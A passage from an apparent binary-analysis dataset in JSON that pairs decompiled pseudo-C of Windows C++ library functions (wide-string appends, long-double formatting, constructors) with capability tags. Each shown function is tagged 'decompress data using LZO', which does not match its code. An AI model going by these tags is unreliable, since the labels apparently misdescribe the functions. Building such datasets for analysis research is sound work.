0x39));\n                    fcn.0046c3b0(puVar13, iVar4);\n                }\n                else {\n                    fcn.0046c3b0(puVar13 + var_40h, *(iVar11 + 0x2c));\n                }\n            }\n            uVar9 = var_44h + *(var_24h + -0xc);\n            uVar12 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar9 = uVar9 + *(iVar11 + 0x18);\n            }\n            var_20h = fcn.0046ba90(0, 0, &var_26h);\n            fcn.0046d280(uVar9 * 2);\n            uVar3 = *(arg_10h + 8);\n            puVar14 = &var_1ch;\n            bVar10 = uVar12 == 0x10 && uVar9 < uVar3;\n            do {\n                if (*puVar14 < 5) {\n    // switch table (5 cases) at 0x502c70\n                    switch(*puVar14) {\n                    case 0:\n                        if (bVar10) {\ncode_r0x0046283d:\n                            fcn.0046c5d0(uVar3 - uVar9, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar10) goto code_r0x0046283d;\n                        fcn.0046d560(arg_14h);\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            fcn.0046c3b0(*(iVar11 + 0x14), *(iVar11 + 0x18));\n                        }\n                        break;\n                    case 3:\n                        if (var_44h != 0) {\n                            fcn.0046d560(*var_50h);\n                        }\n                        break;\n                    case 4:\n                        fcn.0046c470(&var_24h);\n                    }\n                }\n                puVar14 = puVar14 + 1;\n            } while (puVar14 != &var_18h);\n            if (var_44h < 2) {\n                uVar9 = *(var_20h + -0xc);\n            }\n            else {\n                fcn.0046c3b0(var_50h + 1, var_44h - 1);\n                uVar9 = *(var_20h + -0xc);\n            }\n            if (uVar9 < uVar3) {\n                if (uVar12 == 0x20) {\n                    fcn.0046c5d0(uVar3 - uVar9, arg_14h);\n                    uVar9 = uVar3;\n                }\n                else {\n                    fcn.0046bde0(0, 0, uVar3 - uVar9, arg_14h);\n                    uVar9 = uVar3;\n                }\n            }\n            if (var_35h == 0) {\n                uVar12 = (**(*arg_8h + 0x30))(var_20h, uVar9);\n                var_35h = uVar12 != uVar9;\n            }\n            var_34h = arg_ch & 0xffffff00;\n            fcn.0046bf80(&var_25h);\n            fcn.0046bf80(&var_25h);\n        }\n    }\ncode_r0x004625e6:\n    *(arg_10h + 8) = 0;\n    var_34h = var_34h & 0xffffff00 | var_35h;\n    return CONCAT44(var_34h, arg_8h);\n}\n",
        "token_count": 2491
    },
    "00462c20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00462c20(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    unkbyte10 in_stack_00000018;\n    uint uStack116;\n    uint *puStack112;\n    uint32_t auStack108 [2];\n    char *apcStack100 [2];\n    unkbyte10 aStack92 [2];\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t *var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uchar var_21h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    var_3ch = arg_10h;\n    var_40h = arg_18h;\n    auStack108[0] = arg_14h + 0x6c;\n    puStack112 = 0x462c4b;\n    fcn.0048f500();\n    uStack116 = 0x462c56;\n    puStack112 = &fcn.00462c20::var_20h;\n    var_34h = fcn.004a0ae0();\n    uStack116 = 0x462c63;\n    iVar4 = fcn.00418950();\n    iVar4 = -iVar4;\n    piVar7 = &stack0xffffff90 + iVar4;\n    uVar6 = &fcn.00462c20::var_40h + iVar4 + 3 & 0xfffffff0;\n    var_30h = uVar6;\n    *(&stack0xffffff8c + iVar4) = 0x462c74;\n    var_1ch = fcn.0048f260();\n    *(&stack0xffffffa0 + iVar4) = 0;\n    *(&stack0xffffff9c + iVar4) = \"%.*Lf\";\n    *(&stack0xffffff98 + iVar4) = 0x40;\n    *(&stack0xffffffa4 + iVar4) = in_stack_00000018;\n    *(&stack0xffffff94 + iVar4) = uVar6;\n    *(&stack0xffffff90 + iVar4) = &fcn.00462c20::var_1ch;\n    *(&stack0xffffff8c + iVar4) = 0x462ca5;\n    iVar5 = fcn.0049df90();\n    if (0x3f < iVar5) {\n        var_44h = iVar5 + 1;\n        *(&stack0xffffff8c + iVar4) = 0x462cc0;\n        iVar5 = fcn.00418950();\n        iVar5 = -iVar5;\n        piVar7 = &stack0xffffff90 + iVar5 + iVar4;\n        uVar6 = &fcn.00462c20::var_40h + iVar5 + iVar4 + 3 & 0xfffffff0;\n        var_30h = uVar6;\n        *(&stack0xffffff8c + iVar5 + iVar4) = 0x462cd1;\n        var_1ch = fcn.0048f260();\n        iVar3 = var_44h;\n        *(&stack0xffffffa0 + iVar5 + iVar4) = 0;\n        *(&stack0xffffff9c + iVar5 + iVar4) = \"%.*Lf\";\n        *(&stack0xffffffa4 + iVar5 + iVar4) = in_stack_00000018;\n        *(&stack0xffffff98 + iVar5 + iVar4) = iVar3;\n        *(&stack0xffffff94 + iVar5 + iVar4) = uVar6;\n        *(&stack0xffffff90 + iVar5 + iVar4) = &fcn.00462c20::var_1ch;\n        *(&stack0xffffff8c + iVar5 + iVar4) = 0x462cfe;\n        iVar5 = fcn.0049df90();\n    }\n    piVar7[1] = 0;\n    piVar7[2] = &stack0xffffffdb;\n    *piVar7 = iVar5;\n    piVar7[-1] = 0x462d19;\n    fcn.00465b40();\n    if (-1 < *(var_1ch + -4)) {\n        piVar7[-4] = 0x462de7;\n        fcn.00463b40();\n    }\n    iVar4 = *var_34h;\n    piVar7[-1] = var_1ch;\n    iVar5 = iVar5 + var_30h;\n    piVar7[-3] = var_30h;\n    piVar7[-2] = iVar5;\n    pcVar2 = *(iVar4 + 0x2c);\n    puVar8 = piVar7 + -4;\n    piVar7[-4] = 0x462d42;\n    (*pcVar2)();\n    if (var_3ch == '\\0') {\n        *puVar8 = var_40h & 0xffff;\n        puVar8[1] = &fcn.00462c20::var_1ch;\n        puVar8[-2] = arg_ch;\n        puVar8[-1] = arg_14h;\n        puVar8[-3] = arg_8h;\n        puVar8[-4] = 0x462dd4;\n        _var_30h = fcn.00462e50(puVar8[-3], puVar8[-2], puVar8[-1], *puVar8, puVar8[1]);\n    }\n    else {\n        *puVar8 = var_40h & 0xffff;\n        puVar8[1] = &fcn.00462c20::var_1ch;\n        puVar8[-2] = arg_ch;\n        puVar8[-1] = arg_14h;\n        puVar8[-3] = arg_8h;\n        puVar8[-4] = 0x462d73;\n        _var_30h = fcn.00463470(puVar8[-3], puVar8[-2], puVar8[-1], *puVar8, puVar8[1]);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    puVar9 = puVar8 + -8;\n    if (iVar4 < 1) {\n        var_30h = _var_30h;\n        puVar8[-8] = &stack0xffffffdb;\n        var_2ch = _var_30h >> 0x20;\n        puVar8[-9] = 0x462e12;\n        fcn.004640a0();\n        puVar9 = puVar8 + -9;\n    }\n    var_30h = _var_30h;\n    var_2ch = _var_30h >> 0x20;\n    puVar9[-1] = 0x462d9d;\n    fcn.0048f620();\n    return _var_30h;\n}\n",
        "token_count": 1745
    },
    "00462e50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00462e50(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int16_t **arg_18h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    uint32_t uVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    uint uVar15;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    ushort *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint8_t var_35h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    \n    var_34h = arg_ch;\n    var_35h = arg_ch;\n    piVar4 = fcn.004a0ae0(arg_10h + 0x6c);\n    iVar5 = fcn.00432500();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar10 = *piVar7;\n    if (iVar10 == 0) {\n        puVar13 = fcn.004a3500(0x54);\n        puVar13[1] = 0;\n        *puVar13 = 0x50af34;\n        puVar13[2] = 0;\n        puVar13[3] = 0;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 0x12) = 0;\n        puVar13[6] = 0;\n        puVar13[7] = 0;\n        puVar13[8] = 0;\n        puVar13[9] = 0;\n        puVar13[10] = 0;\n        puVar13[0xb] = 0;\n        puVar13[0xc] = 0;\n        puVar13[0xd] = 0;\n        puVar13[0xe] = 0;\n        *(puVar13 + 0x52) = 0;\n        fcn.0048b110(arg_10h + 0x6c);\n        fcn.0048da50(puVar13, iVar5);\n        iVar10 = *piVar7;\n    }\n    piVar11 = *arg_18h;\n    if (*piVar11 == *(iVar10 + 0x3c)) {\n        var_1ch = *(iVar10 + 0x38);\n        var_4ch = *(iVar10 + 0x28);\n        var_40h = *(iVar10 + 0x2c);\n        if (*(piVar11 + -6) != 0) {\n            piVar11 = piVar11 + 1;\n        }\n    }\n    else {\n        var_1ch = *(iVar10 + 0x34);\n        var_40h = *(iVar10 + 0x24);\n        var_4ch = *(iVar10 + 0x20);\n    }\n    iVar5 = (**(*piVar4 + 0x14))(8, piVar11, piVar11 + *(piVar11 + -6));\n    iVar6 = iVar5 - piVar11 >> 1;\n    if (iVar6 != 0) {\n        var_24h = fcn.00463b80(0, 0, &var_20h);\n        fcn.00465500(iVar5 - piVar11);\n        iVar5 = *(iVar10 + 0x30);\n        iVar14 = iVar6 - iVar5;\n        if (0 < iVar14) {\n            if (iVar5 < 0) {\n                iVar14 = iVar6;\n            }\n            if (*(iVar10 + 0xc) == 0) {\n                fcn.00464890(piVar11, iVar14);\n                iVar5 = *(iVar10 + 0x30);\n            }\n            else {\n                fcn.00463f00(0, *(var_24h + -0xc), iVar14 * 2, 0);\n                uVar15 = *(iVar10 + 0xc);\n                uVar2 = *(iVar10 + 8);\n                uVar1 = *(iVar10 + 0x14);\n                if (-1 < *(var_24h + -4)) {\n                    fcn.00463b40();\n                }\n                iVar5 = fcn.0049dab0(var_24h, uVar1, uVar2, uVar15, piVar11, piVar11 + iVar14);\n                if (-1 < *(var_24h + -4)) {\n                    fcn.00463b40();\n                }\n                uVar12 = *(var_24h + -0xc);\n                uVar9 = iVar5 - var_24h >> 1;\n                if (uVar12 < uVar9) {\n                    uVar15 = 0x503008;\n                    piVar7 = fcn.0049f220(0x50301c, 0x503008);\n                    fcn.004640c0(&var_25h, uVar15, uVar9, uVar12);\n                    uVar15 = fcn.0041b360(piVar7);\n                    fcn.004a36d0(uVar15);\n                    (**(*piVar7 + 4))();\n                    do {\n                        uVar15 = fcn.004a3b60();\n                        fcn.004a36d0(uVar15);\n                    } while( true );\n                }\n                fcn.00465630(uVar9, uVar12 - uVar9, 0);\n                iVar5 = *(iVar10 + 0x30);\n            }\n        }\n        if (0 < iVar5) {\n            fcn.004657d0(*(iVar10 + 0x12));\n            if (iVar14 < 0) {\n                fcn.00464770(-iVar14, *(iVar10 + 0x3e));\n                fcn.00464520(piVar11, iVar6);\n            }\n            else {\n                fcn.00464520(piVar11 + iVar14, *(iVar10 + 0x30));\n            }\n        }\n        uVar9 = var_40h + *(var_24h + -0xc);\n        uVar12 = *(arg_10h + 0xc) & 0xb0;\n        if ((*(arg_10h + 0xc) & 0x200) != 0) {\n            uVar9 = uVar9 + *(iVar10 + 0x1c);\n        }\n        var_20h = fcn.00463b80(0, 0, &var_26h);\n        fcn.00465500(uVar9 * 2);\n        uVar3 = *(arg_10h + 8);\n        puVar13 = &var_1ch;\n        bVar8 = uVar12 == 0x10 && uVar9 < uVar3;\n        do {\n            if (*puVar13 < 5) {\n    // switch table (5 cases) at 0x503068\n                switch(*puVar13) {\n                case 0:\n                    if (bVar8) {\ncode_r0x0046312d:\n                        fcn.00464770(uVar3 - uVar9, arg_14h);\n                    }\n                    break;\n                case 1:\n                    if (bVar8) goto code_r0x0046312d;\n                    fcn.004657d0(arg_14h);\n                    break;\n                case 2:\n                    if ((*(arg_10h + 0xd) & 2) != 0) {\n                        fcn.00464520(*(iVar10 + 0x18), *(iVar10 + 0x1c));\n                    }\n                    break;\n                case 3:\n                    if (var_40h != 0) {\n                        fcn.004657d0(*var_4ch);\n                    }\n                    break;\n                case 4:\n                    fcn.00464600(&var_24h);\n                }\n            }\n            puVar13 = puVar13 + 1;\n        } while (puVar13 != &var_18h);\n        if (var_40h < 2) {\n            uVar9 = *(var_20h + -0xc);\n        }\n        else {\n            fcn.00464520(var_4ch + 1, var_40h - 1);\n            uVar9 = *(var_20h + -0xc);\n        }\n        if (uVar9 < uVar3) {\n            if (uVar12 == 0x20) {\n                fcn.00464770(uVar3 - uVar9, arg_14h);\n                uVar9 = uVar3;\n            }\n            else {\n                fcn.00463f00(0, 0, uVar3 - uVar9, arg_14h);\n                uVar9 = uVar3;\n            }\n        }\n        if (var_35h == 0) {\n            uVar12 = (**(*arg_8h + 0x30))(var_20h, uVar9);\n            var_35h = uVar12 != uVar9;\n        }\n        var_34h = arg_ch & 0xffffff00;\n        fcn.004640c0(&var_25h);\n        fcn.004640c0(&var_25h);\n    }\n    *(arg_10h + 8) = 0;\n    var_34h = var_34h & 0xffffff00 | var_35h;\n    return CONCAT44(var_34h, arg_8h);\n}\n",
        "token_count": 2280
    },
    "00463470": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00463470(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int16_t **arg_18h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    uint32_t uVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    uint uVar15;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    ushort *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint8_t var_35h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    \n    var_34h = arg_ch;\n    var_35h = arg_ch;\n    piVar4 = fcn.004a0ae0(arg_10h + 0x6c);\n    iVar5 = fcn.00432500();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar10 = *piVar7;\n    if (iVar10 == 0) {\n        puVar13 = fcn.004a3500(0x54);\n        puVar13[1] = 0;\n        *puVar13 = 0x50af44;\n        puVar13[2] = 0;\n        puVar13[3] = 0;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 0x12) = 0;\n        puVar13[6] = 0;\n        puVar13[7] = 0;\n        puVar13[8] = 0;\n        puVar13[9] = 0;\n        puVar13[10] = 0;\n        puVar13[0xb] = 0;\n        puVar13[0xc] = 0;\n        puVar13[0xd] = 0;\n        puVar13[0xe] = 0;\n        *(puVar13 + 0x52) = 0;\n        fcn.0048b930(arg_10h + 0x6c);\n        fcn.0048da50(puVar13, iVar5);\n        iVar10 = *piVar7;\n    }\n    piVar11 = *arg_18h;\n    if (*piVar11 == *(iVar10 + 0x3c)) {\n        var_1ch = *(iVar10 + 0x38);\n        var_4ch = *(iVar10 + 0x28);\n        var_40h = *(iVar10 + 0x2c);\n        if (*(piVar11 + -6) != 0) {\n            piVar11 = piVar11 + 1;\n        }\n    }\n    else {\n        var_1ch = *(iVar10 + 0x34);\n        var_40h = *(iVar10 + 0x24);\n        var_4ch = *(iVar10 + 0x20);\n    }\n    iVar5 = (**(*piVar4 + 0x14))(8, piVar11, piVar11 + *(piVar11 + -6));\n    iVar6 = iVar5 - piVar11 >> 1;\n    if (iVar6 != 0) {\n        var_24h = fcn.00463b80(0, 0, &var_20h);\n        fcn.00465500(iVar5 - piVar11);\n        iVar5 = *(iVar10 + 0x30);\n        iVar14 = iVar6 - iVar5;\n        if (0 < iVar14) {\n            if (iVar5 < 0) {\n                iVar14 = iVar6;\n            }\n            if (*(iVar10 + 0xc) == 0) {\n                fcn.00464890(piVar11, iVar14);\n                iVar5 = *(iVar10 + 0x30);\n            }\n            else {\n                fcn.00463f00(0, *(var_24h + -0xc), iVar14 * 2, 0);\n                uVar15 = *(iVar10 + 0xc);\n                uVar2 = *(iVar10 + 8);\n                uVar1 = *(iVar10 + 0x14);\n                if (-1 < *(var_24h + -4)) {\n                    fcn.00463b40();\n                }\n                iVar5 = fcn.0049dab0(var_24h, uVar1, uVar2, uVar15, piVar11, piVar11 + iVar14);\n                if (-1 < *(var_24h + -4)) {\n                    fcn.00463b40();\n                }\n                uVar12 = *(var_24h + -0xc);\n                uVar9 = iVar5 - var_24h >> 1;\n                if (uVar12 < uVar9) {\n                    uVar15 = 0x503008;\n                    piVar7 = fcn.0049f220(0x50301c, 0x503008);\n                    fcn.004640c0(&var_25h, uVar15, uVar9, uVar12);\n                    uVar15 = fcn.0041b360(piVar7);\n                    fcn.004a36d0(uVar15);\n                    (**(*piVar7 + 4))();\n                    do {\n                        uVar15 = fcn.004a3b60();\n                        fcn.004a36d0(uVar15);\n                    } while( true );\n                }\n                fcn.00465630(uVar9, uVar12 - uVar9, 0);\n                iVar5 = *(iVar10 + 0x30);\n            }\n        }\n        if (0 < iVar5) {\n            fcn.004657d0(*(iVar10 + 0x12));\n            if (iVar14 < 0) {\n                fcn.00464770(-iVar14, *(iVar10 + 0x3e));\n                fcn.00464520(piVar11, iVar6);\n            }\n            else {\n                fcn.00464520(piVar11 + iVar14, *(iVar10 + 0x30));\n            }\n        }\n        uVar9 = var_40h + *(var_24h + -0xc);\n        uVar12 = *(arg_10h + 0xc) & 0xb0;\n        if ((*(arg_10h + 0xc) & 0x200) != 0) {\n            uVar9 = uVar9 + *(iVar10 + 0x1c);\n        }\n        var_20h = fcn.00463b80(0, 0, &var_26h);\n        fcn.00465500(uVar9 * 2);\n        uVar3 = *(arg_10h + 8);\n        puVar13 = &var_1ch;\n        bVar8 = uVar12 == 0x10 && uVar9 < uVar3;\n        do {\n            if (*puVar13 < 5) {\n    // switch table (5 cases) at 0x503054\n                switch(*puVar13) {\n                case 0:\n                    if (bVar8) {\ncode_r0x0046374d:\n                        fcn.00464770(uVar3 - uVar9, arg_14h);\n                    }\n                    break;\n                case 1:\n                    if (bVar8) goto code_r0x0046374d;\n                    fcn.004657d0(arg_14h);\n                    break;\n                case 2:\n                    if ((*(arg_10h + 0xd) & 2) != 0) {\n                        fcn.00464520(*(iVar10 + 0x18), *(iVar10 + 0x1c));\n                    }\n                    break;\n                case 3:\n                    if (var_40h != 0) {\n                        fcn.004657d0(*var_4ch);\n                    }\n                    break;\n                case 4:\n                    fcn.00464600(&var_24h);\n                }\n            }\n            puVar13 = puVar13 + 1;\n        } while (puVar13 != &var_18h);\n        if (var_40h < 2) {\n            uVar9 = *(var_20h + -0xc);\n        }\n        else {\n            fcn.00464520(var_4ch + 1, var_40h - 1);\n            uVar9 = *(var_20h + -0xc);\n        }\n        if (uVar9 < uVar3) {\n            if (uVar12 == 0x20) {\n                fcn.00464770(uVar3 - uVar9, arg_14h);\n                uVar9 = uVar3;\n            }\n            else {\n                fcn.00463f00(0, 0, uVar3 - uVar9, arg_14h);\n                uVar9 = uVar3;\n            }\n        }\n        if (var_35h == 0) {\n            uVar12 = (**(*arg_8h + 0x30))(var_20h, uVar9);\n            var_35h = uVar12 != uVar9;\n        }\n        var_34h = arg_ch & 0xffffff00;\n        fcn.004640c0(&var_25h);\n        fcn.004640c0(&var_25h);\n    }\n    *(arg_10h + 8) = 0;\n    var_34h = var_34h & 0xffffff00 | var_35h;\n    return CONCAT44(var_34h, arg_8h);\n}\n",
        "token_count": 2279
    },
    "00463ed0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00463ed0(void)\n\n{\n    fcn.00465500(0);\n    return;\n}\n",
        "token_count": 26
    },
    "00464520": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00464520(int32_t *param_1, ushort *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *in_stack_ffffffd8;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    puVar3 = *param_1;\n    if (0x1ffffffeU - *(puVar3 + -6) < param_3) {\n        fcn.0049ec30(0x502512);\n        iVar6 = *(*in_stack_ffffffd8 + -0xc);\n        if (iVar6 != 0) {\n            iVar4 = *extraout_ECX;\n            uVar5 = *(iVar4 + -0xc) + iVar6;\n            if ((uVar5 < *(iVar4 + -8) || uVar5 == *(iVar4 + -8)) && (*(iVar4 + -4) < 1)) {\n                iVar4 = *extraout_ECX;\n                puVar2 = *in_stack_ffffffd8;\n                puVar3 = iVar4 + *(iVar4 + -0xc) * 2;\n            }\n            else {\n                fcn.00465500(uVar5);\n                iVar4 = *extraout_ECX;\n                puVar2 = *in_stack_ffffffd8;\n                puVar3 = iVar4 + *(iVar4 + -0xc) * 2;\n            }\n            if (iVar6 == 1) {\n                *puVar3 = *puVar2;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar3, puVar2, iVar6 * 2);\n                iVar4 = *extraout_ECX;\n            }\n            *(iVar4 + -4) = 0;\n            *(iVar4 + -0xc) = uVar5;\n            *(iVar4 + uVar5 * 2) = 0;\n            return extraout_ECX;\n        }\n        return extraout_ECX;\n    }\n    uVar5 = *(puVar3 + -6) + param_3;\n    if ((*(puVar3 + -4) <= uVar5 && uVar5 != *(puVar3 + -4)) || (piVar1 = puVar3 + -2,  puVar3 = *param_1,  0 < *piVar1)\n       ) {\n        if ((puVar3 <= param_2) && (param_2 <= puVar3 + *(puVar3 + -6))) {\n            iVar6 = param_2 - puVar3;\n            fcn.00465500(uVar5);\n            puVar3 = *param_1;\n            param_2 = iVar6 + puVar3;\n            puVar2 = puVar3 + *(puVar3 + -6);\n            goto joined_r0x004645cd;\n        }\n        fcn.00465500(uVar5);\n        puVar3 = *param_1;\n    }\n    puVar2 = puVar3 + *(puVar3 + -6);\njoined_r0x004645cd:\n    if (param_3 == 1) {\n        *puVar2 = *param_2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar2, param_2, param_3 * 2);\n        puVar3 = *param_1;\n    }\n    *(puVar3 + -2) = 0;\n    *(puVar3 + -6) = uVar5;\n    puVar3[uVar5] = 0;\n    return param_1;\n}\n",
        "token_count": 828
    },
    "00464600": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00464600(int32_t *param_1, int32_t *param_2)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    iVar2 = *(*param_2 + -0xc);\n    if (iVar2 != 0) {\n        iVar4 = *param_1;\n        uVar5 = *(iVar4 + -0xc) + iVar2;\n        if ((uVar5 < *(iVar4 + -8) || uVar5 == *(iVar4 + -8)) && (*(iVar4 + -4) < 1)) {\n            iVar4 = *param_1;\n            puVar3 = *param_2;\n            puVar1 = iVar4 + *(iVar4 + -0xc) * 2;\n        }\n        else {\n            fcn.00465500(uVar5);\n            iVar4 = *param_1;\n            puVar3 = *param_2;\n            puVar1 = iVar4 + *(iVar4 + -0xc) * 2;\n        }\n        if (iVar2 == 1) {\n            *puVar1 = *puVar3;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar1, puVar3, iVar2 * 2);\n            iVar4 = *param_1;\n        }\n        *(iVar4 + -4) = 0;\n        *(iVar4 + -0xc) = uVar5;\n        *(iVar4 + uVar5 * 2) = 0;\n        return param_1;\n    }\n    return param_1;\n}\n",
        "token_count": 368
    },
    "004647a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004647a0(int32_t *param_1, uint32_t param_2, ushort param_3)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint extraout_ECX;\n    uint32_t uVar3;\n    uint uStack56;\n    int32_t *piStack36;\n    \n    iVar1 = *param_1;\n    if (param_2 <= 0x1ffffffeU - *(iVar1 + -0xc)) {\n        uVar3 = *(iVar1 + -0xc) + param_2;\n        if ((uVar3 < *(iVar1 + -8) || uVar3 == *(iVar1 + -8)) && (*(iVar1 + -4) < 1)) {\n            iVar1 = *param_1;\n            puVar2 = iVar1 + *(iVar1 + -0xc) * 2;\n        }\n        else {\n            fcn.00465500(uVar3);\n            iVar1 = *piStack36;\n            puVar2 = iVar1 + *(iVar1 + -0xc) * 2;\n        }\n        if (param_2 == 1) {\n            *puVar2 = param_3;\n        }\n        else if (param_2 != 0) {\n            do {\n                *puVar2 = param_3;\n                puVar2 = puVar2 + 1;\n                param_2 = param_2 - 1;\n            } while (param_2 != 0);\n        }\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0xc) = uVar3;\n        *(iVar1 + uVar3 * 2) = 0;\n        return 0;\n    }\n    fcn.0049ec30(0x502512);\n    fcn.00464330(uStack56, param_2);\n    return extraout_ECX;\n}\n",
        "token_count": 415
    },
    "004657d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004657d0(int32_t *param_1, ushort param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_1;\n    uVar1 = *(iVar2 + -0xc) + 1;\n    if ((*(iVar2 + -8) <= uVar1 && uVar1 != *(iVar2 + -8)) || (0 < *(iVar2 + -4))) {\n        fcn.00465500(uVar1);\n    }\n    iVar2 = *param_1;\n    *(iVar2 + *(iVar2 + -0xc) * 2) = param_2;\n    *(iVar2 + -4) = 0;\n    *(iVar2 + -0xc) = uVar1;\n    *(iVar2 + uVar1 * 2) = 0;\n    return;\n}\n",
        "token_count": 196
    },
    "00466420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00466420(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    in_ECX[0x1f] = 0;\n    *(in_ECX + 0x20) = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[0x23] = 0;\n    in_ECX[0x24] = 0;\n    *in_ECX = 0x506768;\n    in_ECX[3] = 0x50677c;\n    in_ECX[1] = 0;\n    fcn.0049c4a0(arg_8h);\n    in_ECX[2] = 0x506790;\n    in_ECX[3] = 0x5067a4;\n    fcn.0049c4a0(arg_8h);\n    *in_ECX = 0x50a6ec;\n    in_ECX[3] = 0x50a714;\n    in_ECX[2] = 0x50a700;\n    return;\n}\n",
        "token_count": 280
    },
    "00466500": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00466500(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    param_1[0x1f] = 0;\n    *(param_1 + 0x20) = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    param_1[0x24] = 0;\n    *param_1 = 0x506768;\n    param_1[3] = 0x50677c;\n    param_1[1] = 0;\n    fcn.0049c4a0(0);\n    param_1[2] = 0x506790;\n    param_1[3] = 0x5067a4;\n    fcn.0049c4a0(0);\n    *param_1 = 0x50a6ec;\n    param_1[3] = 0x50a714;\n    param_1[2] = 0x50a700;\n    return;\n}\n",
        "token_count": 269
    },
    "00466690": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
